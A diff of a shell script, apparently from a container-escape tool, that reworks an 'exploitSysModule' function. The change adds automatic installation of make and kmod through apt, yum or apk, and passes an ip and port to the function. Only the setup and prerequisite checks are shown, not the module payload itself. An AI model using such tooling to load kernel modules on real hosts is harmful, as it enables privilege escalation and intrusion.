@@ -1,29 +1,58 @@
 #!/bin/sh
 
-ip=$1
-port=$2
+install_with_pkg()
+{
+    arg1=$1
+    echo $arg1
+    
+    echo "[+] Running update: $arg1 update."
+    $arg1 -y update
+
+    echo "[+] Installing make: $arg1 install make."
+    $arg1 -y install make
+
+    echo "[+] Installing inosmod: $arg1 install kmod."
+    $arg1 -y install kmod
+}
+
 
 exploitSysModule(){
   RED=$(tput bold)$(tput setaf 1)
-	DEFAULT_COLOR=$(tput sgr0)
+  DEFAULT_COLOR=$(tput sgr0)
 
+  ip=$1
+  port=$2
+  installRequiredFiles=$3
+  
   echo "[i] Exploiting SYS_MODULE"
   echo $ip
   echo $port
+  echo $installRequiredFiles
 
-
-  if ! [ -x "$(command -v make)" ]; then
-    echo "${RED}[i] ${DEFAULT_COLOR} make is required to run this exploit."
-    exit 1
+  if [ $installRequiredFiles = "true" ]; then
+      if [ -x "$(command -v apt)" ]; then
+  	  install_with_pkg "apt"
+  	elif [ -x "$(command -v yum)" ]; then
+  	  install_with_pkg "yum"
+  	elif [ -x "$(command -v apk)" ]; then
+  	  install_with_pkg "apk"
+  	else
+  	  echo "[!] Can't install files."
+  	  exit 1
+      fi
+  else
+    if ! [ -x "$(command -v make)" ]; then
+      echo "[!] make is required to run this exploit."
+      exit 1
+    fi
+  
+    if ! [ -x "$(command -v insmod)" ]; then
+      echo "[!] insmod is required to run this exploit."
+      exit 1
+    fi
   fi
 
-  if ! [ -x "$(command -v insmod)" ]; then
-    echo "${RED}[i] ${DEFAULT_COLOR} insmod is required to run this exploit."
-    exit 1
-  fi
-
-
-	if ! [ -d "/lib/modules/$(uname -r)" ]; then
+  if ! [ -d "/lib/modules/$(uname -r)" ]; then
     echo "${RED}[i] ${DEFAULT_COLOR} The directory /lib/modules/$(uname -r) is required to run this exploit."
     exit 1
   fi
